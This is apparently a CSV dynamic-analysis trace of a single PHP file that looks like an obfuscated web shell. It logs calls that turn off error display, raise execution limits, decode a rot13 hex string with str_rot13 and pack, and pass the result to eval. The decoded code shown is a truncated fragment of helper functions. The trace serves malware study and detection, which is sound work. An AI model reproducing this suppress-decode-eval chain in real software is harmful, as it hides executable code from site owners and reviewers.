uuid,file_md5,index,source,target,argc,argv,return,dynamic
20dccba2eba7ec86990b699d2dca4dc2,719d199d10a8a3ca0fe0ee19079602e9,0,__main__,zend_compile_file,2.0,"{""value"": []}","{""value"": ""28413C3941413C3A3941413C3A3941413C3A413C41413C2600003C3E""}",[]
20dccba2eba7ec86990b699d2dca4dc2,719d199d10a8a3ca0fe0ee19079602e9,1,__main__,error_reporting,1.0,"{""value"": [[0, ""new_error_level"", 1]]}","{""value"": ""void""}",[0]
20dccba2eba7ec86990b699d2dca4dc2,719d199d10a8a3ca0fe0ee19079602e9,2,__main__,ini_set,2.0,"{""value"": [[0, ""varname"", ""display_errors""], [1, ""newvalue"", ""Off""]]}","{""value"": ""void""}","[0, 0]"
20dccba2eba7ec86990b699d2dca4dc2,719d199d10a8a3ca0fe0ee19079602e9,3,__main__,ini_set,2.0,"{""value"": [[0, ""varname"", ""max_execution_time""], [1, ""newvalue"", 20000]]}","{""value"": ""void""}","[0, 0]"
20dccba2eba7ec86990b699d2dca4dc2,719d199d10a8a3ca0fe0ee19079602e9,4,__main__,ini_set,2.0,"{""value"": [[0, ""varname"", ""memory_limit""], [1, ""newvalue"", ""256M""]]}","{""value"": ""void""}","[0, 0]"
20dccba2eba7ec86990b699d2dca4dc2,719d199d10a8a3ca0fe0ee19079602e9,5,__main__,header,1.0,"{""value"": [[0, ""header"", ""content-Type: text/html; charset=utf-8""]]}","{""value"": ""void""}",[0]
20dccba2eba7ec86990b699d2dca4dc2,719d199d10a8a3ca0fe0ee19079602e9,6,__main__,define,2.0,"{""value"": [[0, ""constant_name"", ""Viv, bebegim.""], [1, ""value"", ""Denzel-\\xe4\\xbd\\xa0\\xe7\\x9a\\x84\\xe8\\x8b\\xb1\\xe9\\x9b\\x84""]]}","{""value"": ""void""}","[0, 0]"
20dccba2eba7ec86990b699d2dca4dc2,719d199d10a8a3ca0fe0ee19079602e9,7,__main__,s,0.0,"{""value"": []}","{""value"": ""void""}",[]
20dccba2eba7ec86990b699d2dca4dc2,719d199d10a8a3ca0fe0ee19079602e9,8,s,str_rot13,1.0,"{""value"": [[0, ""str"", ""66756r6374696s6r20737472646972282473747229207o2072657475726r207374725s7265706p61636528617272617928275p5p272p272s2s272p27253237272p""]]}","{""value"": ""66756e6374696f6e20737472646972282473747229207b2072657475726e207374725f7265706c61636528617272617928275c5c272c272f2f272c27253237272c""}",[0]
20dccba2eba7ec86990b699d2dca4dc2,719d199d10a8a3ca0fe0ee19079602e9,9,s,pack,2.0,"{""value"": [[0, ""format"", ""H*""], [1, ""args"", ""66756e6374696f6e20737472646972282473747229207b2072657475726e207374725f7265706c61636528617272617928275c5c272c272f2f272c27253237272c""]]}","{""value"": ""function strdir($str) { return str_replace(array('\\\\','//','%27','%22'),array('/','/','\\'','\""'),chop($str)); }\r\nfunction chkgpc($a""}","[0, 0]"
20dccba2eba7ec86990b699d2dca4dc2,719d199d10a8a3ca0fe0ee19079602e9,10,s,m,1.0,"{""value"": [[0, ""str"", ""66756e6374696f6e20737472646972282473747229207b2072657475726e207374725f7265706c61636528617272617928275c5c272c272f2f272c27253237272c""]]}","{""value"": ""void""}",[0]
20dccba2eba7ec86990b699d2dca4dc2,719d199d10a8a3ca0fe0ee19079602e9,11,m,str_ireplace,3.0,"{""value"": [[0, ""search"", ""asdasdasd""], [1, ""replace"", """"], [2, ""subject"", ""asdasdasd""]]}","{""value"": """"}","[0, 0, 0]"
20dccba2eba7ec86990b699d2dca4dc2,719d199d10a8a3ca0fe0ee19079602e9,12,m,str_ireplace,3.0,"{""value"": [[0, ""search"", ""asdasdasd""], [1, ""replace"", """"], [2, ""subject"", ""asdasdasd""]]}","{""value"": """"}","[0, 0, 0]"
20dccba2eba7ec86990b699d2dca4dc2,719d199d10a8a3ca0fe0ee19079602e9,13,m,eval,1.0,"{""value"": [[0, ""phpcode"", ""function strdir($str) { return str_replace(array('\\\\','//','%27','%22'),array('/','/','\\'','\""'),chop($str)); }\r\nfunction chkgpc($a""]]}","{""value"": ""void""}",[0]
